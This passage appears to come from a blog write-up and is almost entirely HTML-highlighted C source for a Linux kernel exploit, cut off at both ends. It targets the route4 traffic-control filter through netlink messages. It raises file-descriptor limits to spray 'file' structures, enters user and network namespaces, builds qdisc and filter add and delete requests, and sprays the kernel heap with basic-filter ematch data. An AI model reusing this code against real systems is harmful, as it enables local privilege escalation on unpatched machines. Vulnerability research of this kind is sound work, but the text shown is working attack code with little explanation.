&amp;rlim);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">136</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">    <span class="comment">// setrlimit(RLIMIT_FSIZE, &amp;rlim);</span></span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">1</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">    setrlimit(RLIMIT_STACK, &amp;rlim);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">0</span>;</span><br><span class="line">    setrlimit(RLIMIT_CORE, &amp;rlim);</span><br><span class="line">    <span class="comment">// RLIMIT_FILE</span></span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">14096</span>;</span><br><span class="line">    <span class="keyword">if</span> (setrlimit(RLIMIT_NOFILE, &amp;rlim) &lt; <span class="number">0</span>) &#123;  <span class="comment">// RLIMIT_NOFILE 最大打开文件描述符限制，默认为 1024, 需设置为 14096, 便于喷射 `file` 结构</span></span><br><span class="line">        rlim.rlim_cur = rlim.rlim_max = <span class="number">4096</span>;</span><br><span class="line">        spray_num_1 = <span class="number">1200</span>;</span><br><span class="line">        spray_num_2 = <span class="number">2800</span>;</span><br><span class="line">        <span class="keyword">if</span> (setrlimit(RLIMIT_NOFILE, &amp;rlim) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;[-] setrlimit&quot;</span>);</span><br><span class="line">            err(<span class="number">1</span>, <span class="string">&quot;[-] setrlimit&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup_namespace</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> real_uid = getuid();</span><br><span class="line">    <span class="keyword">int</span> real_gid = getgid();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWUSER) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWNET) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/setgroups&quot;</span>, <span class="string">&quot;deny&quot;</span>)) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] write_file(/proc/self/set_groups)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/uid_map&quot;</span>, <span class="string">&quot;0 %d 1\n&quot;</span>, real_uid)) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] write_file(/proc/self/uid_map)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/gid_map&quot;</span>, <span class="string">&quot;0 %d 1\n&quot;</span>, real_gid)) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] write_file(/proc/self/gid_map)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set up process memory / working dir / namespace</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pre_exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    adjust_rlimit();</span><br><span class="line">    use_temporary_dir();</span><br><span class="line">    setup_namespace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NLMSG_TAIL(nmsg)                                                       \</span></span><br><span class="line"><span class="meta">  ((struct rtattr *)(((void *)(nmsg)) + NLMSG_ALIGN((nmsg)-&gt;nlmsg_len)))</span></span><br><span class="line"><span class="comment">// add attribute</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addattr</span><span class="params">(<span class="keyword">char</span>* attr, <span class="keyword">int</span> type, <span class="keyword">void</span>* data, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">rta</span> =</span> (struct rtattr*)attr;</span><br><span class="line"></span><br><span class="line">    rta-&gt;rta_type = type;</span><br><span class="line">    rta-&gt;rta_len = RTA_LENGTH(len);</span><br><span class="line">    <span class="keyword">if</span> (len)</span><br><span class="line">        <span class="built_in">memcpy</span>(RTA_DATA(attr), data, len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> RTA_LENGTH(len);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// add attribute (maxlen limitation)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addattr_l</span><span class="params">(struct nlmsghdr* n, <span class="keyword">int</span> maxlen, <span class="keyword">int</span> type, <span class="keyword">const</span> <span class="keyword">void</span>* data, <span class="keyword">int</span> alen)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = RTA_LENGTH(alen);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">rta</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (NLMSG_ALIGN(n-&gt;nlmsg_len) + RTA_ALIGN(len) &gt; maxlen) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;addattr_l ERROR: message exceeded bound of %d\n&quot;</span>, maxlen);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    rta = NLMSG_TAIL(n);</span><br><span class="line">    rta-&gt;rta_type = type;</span><br><span class="line">    rta-&gt;rta_len = len;</span><br><span class="line">    <span class="keyword">if</span> (alen)</span><br><span class="line">        <span class="built_in">memcpy</span>(RTA_DATA(rta), data, alen);</span><br><span class="line">    n-&gt;nlmsg_len = NLMSG_ALIGN(n-&gt;nlmsg_len) + RTA_ALIGN(len);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct rtattr* <span class="title">addattr_nest</span><span class="params">(struct nlmsghdr* n, <span class="keyword">int</span> maxlen, <span class="keyword">int</span> type)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">nest</span> =</span> NLMSG_TAIL(n);</span><br><span class="line"></span><br><span class="line">    addattr_l(n, maxlen, type, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> nest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addattr_nest_end</span><span class="params">(struct nlmsghdr* n, struct rtattr* nest)</span> </span>&#123;</span><br><span class="line">    nest-&gt;rta_len = (<span class="keyword">void</span>*)NLMSG_TAIL(n) - (<span class="keyword">void</span>*)nest;</span><br><span class="line">    <span class="keyword">return</span> n-&gt;nlmsg_len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// add_qdisc() —— setup the socket</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_qdisc</span><span class="params">(<span class="keyword">int</span> fd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* start = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span>* <span class="title">msg</span> =</span> (struct nlmsghdr*)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new qdisc                                          nlmsghdr + tcmsg</span></span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;</span><br><span class="line">    msg-&gt;nlmsg_type = RTM_NEWQDISC;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span>* <span class="title">t</span> =</span> (struct tcmsg*)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line">    <span class="comment">// set local</span></span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_parent = TC_H_ROOT;</span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_KIND, <span class="string">&quot;sfq&quot;</span>, <span class="number">4</span>);       <span class="comment">// sfq is not defaully configured, only qfq is configured</span></span><br><span class="line">    <span class="comment">// print_hex(msg, msg-&gt;nlmsg_len);</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123; .iov_base = msg, .iov_len = msg-&gt;nlmsg_len &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123; .nl_family = AF_NETLINK &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> sendmsg(fd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// spray 1 vulnerable object (filter) with customized flags</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_tc_</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">u_int32_t</span> from, <span class="keyword">u_int32_t</span> to, <span class="keyword">u_int32_t</span> handle, <span class="keyword">u_int16_t</span> flags)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* start = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span>* <span class="title">msg</span> =</span> (struct nlmsghdr*)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new filter</span></span><br><span class="line">    msg = msg + msg-&gt;nlmsg_len;</span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | flags;</span><br><span class="line">    msg-&gt;nlmsg_type = RTM_NEWTFILTER;                               <span class="comment">// RTM_NEWTFILTER</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span>* <span class="title">t</span> =</span> (struct tcmsg*)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_handle = handle;</span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_KIND, <span class="string">&quot;route&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">tail</span> =</span> addattr_nest(msg, <span class="number">0x1000</span>, TCA_OPTIONS);</span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_ROUTE4_FROM, &amp;from, <span class="number">4</span>);              <span class="comment">// TCA_ROUTE4_FROM</span></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_ROUTE4_TO, &amp;to, <span class="number">4</span>);                  <span class="comment">// TCA_ROUTE4_TO</span></span><br><span class="line">    addattr_nest_end(msg, tail);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123; .iov_base = msg, .iov_len = msg-&gt;nlmsg_len &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123; .nl_family = AF_NETLINK &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    sendmsg(fd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(start);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_tc</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">uint32_t</span> handle, <span class="keyword">uint16_t</span> flag)</span> </span>&#123;</span><br><span class="line">    add_tc_(sockfd, <span class="number">0</span>, handle, (handle &lt;&lt; <span class="number">8</span>) + handle, flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">calc_handle</span><span class="params">(<span class="keyword">uint32_t</span> from, <span class="keyword">uint32_t</span> to)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> handle = to;</span><br><span class="line"></span><br><span class="line">    assert(from &lt;= <span class="number">0xff</span> &amp;&amp; to &lt;= <span class="number">0xff</span>);</span><br><span class="line">    handle |= from &lt;&lt; <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (((handle &amp; <span class="number">0x7f00</span>) | handle) != handle)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (handle == <span class="number">0</span> || (handle &amp; <span class="number">0x8000</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> handle;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">delete_tc_</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">u_int32_t</span> handle)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* start = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span>* <span class="title">msg</span> =</span> (struct nlmsghdr*)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// delete filter</span></span><br><span class="line">    msg = msg + msg-&gt;nlmsg_len;</span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO;</span><br><span class="line">    msg-&gt;nlmsg_type = RTM_DELTFILTER;                                   <span class="comment">// RTM_DELTFILTER</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span>* <span class="title">t</span> =</span> (struct tcmsg*)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_handle = handle;</span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_KIND, <span class="string">&quot;route&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">tail</span> =</span> addattr_nest(msg, <span class="number">0x1000</span>, TCA_OPTIONS);</span><br><span class="line">    addattr_nest_end(msg, tail);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123; .iov_base = msg, .iov_len = msg-&gt;nlmsg_len &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123; .nl_family = AF_NETLINK &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    sendmsg(sockfd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    iov.iov_len = <span class="number">0x4000</span>;</span><br><span class="line">    iov.iov_base = start;</span><br><span class="line">    recvmsg(sockfd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgh.msg_namelen != <span class="keyword">sizeof</span>(nladdr))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] size of sender address is wrong\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> start;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_tc</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">uint32_t</span> handle)</span> </span>&#123;</span><br><span class="line">    delete_tc_(sockfd, ((handle) &lt;&lt; <span class="number">8</span>) + (handle));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// spray spray_count objects ???</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_tc_basic</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint32_t</span> handle, <span class="keyword">void</span>* spray_data, <span class="keyword">size_t</span> spray_len, <span class="keyword">int</span> spray_count)</span> </span>&#123;</span><br><span class="line">    assert(spray_len * spray_count &lt; <span class="number">0x3000</span>);</span><br><span class="line">    <span class="keyword">char</span>* start = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span>* <span class="title">msg</span> =</span> (struct nlmsghdr*)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new filter                      nlmsghdr + tcmsg</span></span><br><span class="line">    msg = msg + msg-&gt;nlmsg_len;</span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE; <span class="comment">// | flags;</span></span><br><span class="line">    msg-&gt;nlmsg_type = RTM_NEWTFILTER;                               <span class="comment">// RTM_NEWTFILTER</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span>* <span class="title">t</span> =</span> (struct tcmsg*)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_handle = handle;</span><br><span class="line">    <span class="comment">// t-&gt;tcm_parent = TC_H_ROOT;</span></span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x4000</span>, TCA_KIND, <span class="string">&quot;basic&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">tail</span> =</span> addattr_nest(msg, <span class="number">0x4000</span>, TCA_OPTIONS);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">ema_tail</span> =</span> addattr_nest(msg, <span class="number">0x4000</span>, TCA_BASIC_EMATCHES);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcf_ematch_tree_hdr</span> <span class="title">tree_hdr</span> =</span> &#123; .nmatches = spray_count / <span class="number">2</span>,</span><br><span class="line">                                           .progid = <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x4000</span>, TCA_EMATCH_TREE_HDR, &amp;tree_hdr, <span class="keyword">sizeof</span>(tree_hdr));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">rt_match_tail</span> =</span> addattr_nest(msg, <span class="number">0x4000</span>, TCA_EMATCH_TREE_LIST);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* data = <span class="built_in">malloc</span>(<span class="number">0x3000</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tree_hdr.nmatches; i++) &#123;</span><br><span class="line">        <span class="keyword">char</span>* current;</span><br><span class="line">        <span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="number">0x3000</span>);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tcf_ematch_hdr</span>* <span class="title">hdr</span> =</span> (struct tcf_ematch_hdr*)data;</span><br><span class="line">        hdr-&gt;kind = TCF_EM_META;</span><br><span class="line">        hdr-&gt;flags = TCF_EM_REL_AND;</span><br><span class="line"></span><br><span class="line">        current = data + <span class="keyword">sizeof</span>(*hdr);</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tcf_meta_hdr</span> <span class="title">meta_hdr</span> =</span> &#123;</span><br><span class="line">            .left.kind = TCF_META_TYPE_VAR &lt;&lt; <span class="number">12</span> | TCF_META_ID_DEV,</span><br><span class="line">            .right.kind = TCF_META_TYPE_VAR &lt;&lt; <span class="number">12</span> | TCF_META_ID_DEV,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        current += addattr(current, TCA_EM_META_HDR, &amp;meta_hdr, <span class="keyword">sizeof</span>(hdr));</span><br><span class="line">        current += addattr(current, TCA_EM_META_LVALUE, spray_data, spray_len);</span><br><span class="line">        current += addattr(current, TCA_EM_META_RVALUE, spray_data, spray_len);</span><br><span class="line"></span><br><span class="line">        addattr_l(msg, <span class="number">0x4000</span>, i + <span class="number">1</span>, data, current - data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    addattr_nest_end(msg, rt_match_tail);</span><br><span class="line">    addattr_nest_end(msg, ema_tail);</span><br><span class="line">    addattr_nest_end(msg, tail);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123; .iov_base = msg, .iov_len = msg-&gt;nlmsg_len &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123; .nl_family = AF_NETLINK &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    sendmsg(fd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(data);</span><br><span class="line">    <span class="built_in">free</span>(start);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">delete_tc_basic</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">u_int32_t</span> handle)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* start = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span>* <span class="title">msg</span> =</span> (struct nlmsghdr*)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// delete filter</span></span><br><span class="line">    msg = msg + msg-&gt;nlmsg_len;</span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO;</span><br><span class="line">    msg-&gt;nlmsg_type = RTM_DELTFILTER;                           <span class="comment">// RTM_DELTFILTER</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span>* <span class="title">t</span> =</span> (struct tcmsg*)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_handle = handle;</span><br><span class="line">    <span class="comment">// t-&gt;tcm_parent = TC_H_ROOT;</span></span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_KIND, <span class="string">&quot;basic&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">tail</span> =</span> addattr_nest(msg, <span class="number">0x1000</span>, TCA_OPTIONS);</span><br><span class="line">    addattr_nest_end(msg, tail);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123; .iov_base = msg, .iov_len = msg-&gt;nlmsg_len &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123; .nl_family = AF_NETLINK &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    sendmsg(sockfd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    iov.iov_len = <span class="number">0x4000</span>;</span><br><span class="line">    iov.iov_base = start;</span><br><span class="line">    recvmsg(sockfd, &amp;msgh, 